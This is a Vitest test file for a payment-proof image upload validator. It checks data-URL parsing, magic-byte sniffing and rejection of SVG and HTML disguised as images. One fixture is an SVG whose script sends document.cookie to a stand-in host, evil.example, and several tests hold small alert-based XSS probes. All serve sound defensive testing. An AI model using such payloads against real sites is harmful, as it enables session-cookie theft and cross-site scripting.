import { describe, expect, it } from "vitest";
import { checkProofImage, parseDataUrl, sniffImageType } from "@/lib/image-type";

/**
 * The upload gate for payment proofs.
 *
 * The bug this exists to prevent: `data:image/svg+xml` passed a check that only
 * looked at the prefix `data:image/`, and the proof route then served those
 * bytes back with Cloudinary's own content type - `image/svg+xml` - from the
 * app's own origin, where the script inside it runs as the signed-in user.
 * So both halves are tested here: the declared type, and the bytes themselves.
 */
const b64 = (bytes: number[]) => Buffer.from(bytes).toString("base64");
/** The same, for text payloads (an SVG, an HTML page). */
const b64Text = (text: string) => Buffer.from(text, "utf8").toString("base64");
const dataUrl = (mime: string, base64: string) => `data:${mime};base64,${base64}`;

// Real signatures, and enough trailing bytes to look like a file.
const JPEG = b64([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]);
const PNG = b64([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d]);
const GIF = b64([0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00]);
const WEBP = b64([
  0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50, 0x56, 0x50, 0x38, 0x20,
]);
const HEIC = b64([
  0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x68, 0x65, 0x69, 0x63, 0x00, 0x00, 0x00, 0x00,
]);
const AVIF = b64([
  0x00, 0x00, 0x00, 0x1c, 0x66, 0x74, 0x79, 0x70, 0x61, 0x76, 0x69, 0x66, 0x00, 0x00, 0x00, 0x00,
]);

/** The attack, in the shape it arrives. */
const SVG_WITH_SCRIPT = b64Text(
  `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://evil.example/'+document.cookie)</script></svg>`
);

describe("parseDataUrl", () => {
  it("accepts a plain base64 image data URL", () => {
    expect(parseDataUrl(dataUrl("image/jpeg", JPEG))).toEqual({ mime: "image/jpeg", base64: JPEG });
  });

  it("takes the mime case-insensitively", () => {
    expect(parseDataUrl(`data:IMAGE/PNG;base64,${PNG}`)?.mime).toBe("image/png");
  });

  it("rejects a data URL that is not base64 - the smuggling route", () => {
    // `data:image/svg+xml,<svg onload=…>` would otherwise arrive as raw markup.
    expect(parseDataUrl(`data:image/svg+xml,<svg onload="alert(1)"></svg>`)).toBeNull();
    expect(parseDataUrl("data:image/png;charset=utf-8;base64,AAAA")).toBeNull();
  });

  it("rejects anything that is not a well-formed base64 payload", () => {
    expect(parseDataUrl("data:image/png;base64,not base64!!")).toBeNull();
    expect(parseDataUrl("http://example.com/a.png")).toBeNull();
    expect(parseDataUrl("")).toBeNull();
  });
});

describe("sniffImageType", () => {
  it("recognises the raster formats the app accepts", () => {
    for (const [name, base64] of Object.entries({ JPEG, PNG, GIF, WEBP, HEIC, AVIF })) {
      const bytes = Buffer.from(base64, "base64");
      expect(sniffImageType(new Uint8Array(bytes)), name).not.toBeNull();
    }
  });

  it("returns null for anything that is not one of them", () => {
    // SVG, HTML, PDF, zip: all of these have been used to get around
    // extension- or mime-only upload checks.
    const notImages = [
      Buffer.from("<svg xmlns='http://www.w3.org/2000/svg'></svg>"),
      Buffer.from("<!doctype html><script>alert(1)</script>"),
      Buffer.from("%PDF-1.7\n"),
      Buffer.from("PK\x03\x04"),
      Buffer.alloc(32, 0),
    ];
    for (const bytes of notImages) {
      expect(sniffImageType(new Uint8Array(bytes))).toBeNull();
    }
  });
});

describe("checkProofImage", () => {
  it("accepts a real photo of each supported type", () => {
    const cases: [string, string][] = [
      ["image/jpeg", JPEG],
      ["image/png", PNG],
      ["image/gif", GIF],
      ["image/webp", WEBP],
      ["image/heic", HEIC],
      ["image/avif", AVIF],
    ];
    for (const [mime, payload] of cases) {
      const result = checkProofImage(dataUrl(mime, payload));
      expect(result.ok, mime).toBe(true);
    }
  });

  it("refuses an SVG, and says why in words a person can act on", () => {
    const result = checkProofImage(dataUrl("image/svg+xml", SVG_WITH_SCRIPT));
    expect(result.ok).toBe(false);
    // The user-facing half of this: it must not read like a stack trace.
    if (!result.ok) {
      expect(result.error).toMatch(/PNG or JPEG/);
      expect(result.error).toMatch(/document that can run code/);
    }
  });

  it("refuses markup dressed as a raster image", () => {
    // The declared type is allowed and the bytes are not: this is the check
    // that a mime-type allowlist alone would have missed.
    const disguised = checkProofImage(`data:image/png;base64,${SVG_WITH_SCRIPT}`);
    expect(disguised.ok).toBe(false);
    const htmlPng = checkProofImage(`data:image/png;base64,${b64Text("<html>hi</html>")}`);
    expect(htmlPng.ok).toBe(false);
  });

  it("refuses a real image whose declared type is not accepted", () => {
    // A TIFF (or BMP) is a picture, but not one this app promises to store.
    const tiff = b64([0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    expect(checkProofImage(dataUrl("image/tiff", tiff)).ok).toBe(false);
  });

  it("rejects a plain-text or truncated payload", () => {
    expect(checkProofImage("data:image/png;base64,AAAA").ok).toBe(false);
    expect(checkProofImage("not a data url").ok).toBe(false);
  });
});
